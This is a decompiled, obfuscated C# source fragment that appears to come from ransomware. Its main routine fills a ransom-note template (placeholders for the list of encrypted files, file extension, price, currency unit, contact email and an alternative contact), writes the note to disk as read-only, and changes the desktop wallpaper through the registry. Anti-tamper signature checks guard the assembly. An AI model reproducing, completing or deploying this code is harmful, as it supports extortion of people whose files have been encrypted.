using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using ns0;
using ns1;
using ns2;

namespace Main;

internal sealed class Miscellaneous
{
	internal sealed class Class15
	{
		internal static string string_0 = string.Empty;

		internal static string smethod_0(IList<byte> ilist_0)
		{
			string text = string.Empty;
			for (int i = 0; i < ilist_0.Count; i++)
			{
				byte num = ilist_0[i];
				int num2 = num & 0xF;
				int num3 = (num >> 4) & 0xF;
				text = ((num3 <= 9) ? (text + num3.ToString(CultureInfo.InvariantCulture)) : (text + ((char)(num3 - 10 + 65)).ToString(CultureInfo.InvariantCulture)));
				text = ((num2 <= 9) ? (text + num2.ToString(CultureInfo.InvariantCulture)) : (text + ((char)(num2 - 10 + 65)).ToString(CultureInfo.InvariantCulture)));
				if (i + 1 != ilist_0.Count && (i + 1) % 2 == 0)
				{
					text += "-";
				}
			}
			return text;
		}
	}

	public sealed class Class16
	{
		[CompilerGenerated]
		private string string_0;

		[CompilerGenerated]
		private int int_0;

		[CompilerGenerated]
		private int int_1;

		[CompilerGenerated]
		private int int_2;

		[SpecialName]
		[CompilerGenerated]
		public string method_0()
		{
			return string_0;
		}

		[SpecialName]
		[CompilerGenerated]
		public void method_1(string string_1)
		{
			string_0 = string_1;
		}

		[SpecialName]
		[CompilerGenerated]
		public int method_2()
		{
			return int_0;
		}

		[SpecialName]
		[CompilerGenerated]
		public void method_3(int int_3)
		{
			int_0 = int_3;
		}

		[SpecialName]
		[CompilerGenerated]
		public int method_4()
		{
			return int_1;
		}

		[SpecialName]
		[CompilerGenerated]
		public void method_5(int int_3)
		{
			int_1 = int_3;
		}

		[SpecialName]
		[CompilerGenerated]
		public int method_6()
		{
			return int_2;
		}

		[SpecialName]
		[CompilerGenerated]
		public void method_7(int int_3)
		{
			int_2 = int_3;
		}

		internal Class16()
		{
		}

		internal static string smethod_0(OperatingSystem operatingSystem_0)
		{
			string result = "Unknown";
			switch (operatingSystem_0.Version.Minor)
			{
			case 90:
				result = "Windows Me";
				break;
			case 10:
			{
				string text = operatingSystem_0.Version.Revision.ToString();
				result = ((!(text == "2222A")) ? "Windows 98" : "Windows 98 Second Edition");
				break;
			}
			case 0:
				result = "Windows 95";
				break;
			}
			return result;
		}
	}

	public static class Class17
	{
		static Class17()
		{
			bool bool_ = false;
			Assembly executingAssembly = Assembly.GetExecutingAssembly();
			Uri uri = new Uri(executingAssembly.CodeBase!.Replace("%", "%25").Replace("#", "%23"));
			if (!Class27.StrongNameSignatureVerificationEx_3(uri.LocalPath, bool_0: true, out bool_) || !bool_ || !executingAssembly.FullName!.EndsWith("a459aa267b8f616b"))
			{
				throw new SecurityException("Assembly has been tampered");
			}
		}
	}

	public sealed class Class18
	{
		public enum Enum1
		{
			const_0,
			const_1,
			const_2
		}

		private Class18()
		{
		}

		public static void smethod_0(string string_0, Enum1 enum1_0)
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
			if (enum1_0 == Enum1.const_2)
			{
				registryKey.SetValue("WallpaperStyle", 2.ToString());
				registryKey.SetValue("TileWallpaper", 0.ToString());
			}
			if (enum1_0 == Enum1.const_1)
			{
				registryKey.SetValue("WallpaperStyle", 1.ToString());
				registryKey.SetValue("TileWallpaper", 0.ToString());
			}
			if (enum1_0 == Enum1.const_0)
			{
				registryKey.SetValue("WallpaperStyle", 1.ToString());
				registryKey.SetValue("TileWallpaper", 1.ToString());
			}
			Class27.SystemParametersInfo(20, 0, string_0, 3);
		}
	}

	[CompilerGenerated]
	internal sealed class Class19
	{
		public Random random_0;

		internal char method_0(string string_0)
		{
			return string_0[random_0.Next(string_0.Length)];
		}
	}

	public static void smethod_0(string string_0)
	{
		try
		{
			Class4.Class5.smethod_63(Regex.Replace(Class4.Class5.smethod_62(), "%Encrypted", Class8.Class9.smethod_0().Replace(Environment.NewLine, "<br>")));
			Class4.Class5.smethod_63(Regex.Replace(Class4.Class5.smethod_62(), "%Extension", "." + Convert.ToString(Class8.Class9.smethod_6())));
			string replacement = Class4.Class5.smethod_34().ToString().Replace(",", ".");
			Class4.Class5.smethod_63(Regex.Replace(Class4.Class5.smethod_62(), "%Price", replacement));
			Class4.Class5.smethod_63(Regex.Replace(Class4.Class5.smethod_62(), "%Unit", Convert.ToString(Class4.Class5.smethod_36())));
			Class4.Class5.smethod_63(Regex.Replace(Class4.Class5.smethod_62(), "%Email", Class4.Class5.smethod_30()));
			Class4.Class5.smethod_63(Regex.Replace(Class4.Class5.smethod_62(), "%Alternative", Class4.Class5.smethod_32()));
			string_0 = Path.Combine(string_0, Class4.Class5.smethod_58().Replace("%1", Class8.Class9.smethod_6())) + "." + Class4.Class5.smethod_60();
			using (TextWriter textWriter = File.CreateText(string_0))
			{
				textWriter.Write(Class4.Class5.smethod_62());
				textWriter.Close();
			}
			File.SetAttributes(string_0, FileAttributes.ReadOnly);
		}
		catch (Exception)
		{
		}
	}

	static Miscellaneous()
	{
		bool bool_ = false;
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		Uri uri = new Uri(executingAssembly.CodeBase!.Replace("%", "%25").Replace("#", "%23"));
		if (!Class27.StrongNameSignatureVerificationEx_6(uri.LocalPath, bool_0: true, out bool_) || !bool_ || !executingAssembly.FullName!.EndsWith("a459aa267b8f616b"))
		{
			throw new SecurityException("Assembly has been tampered");
		}
	}
}
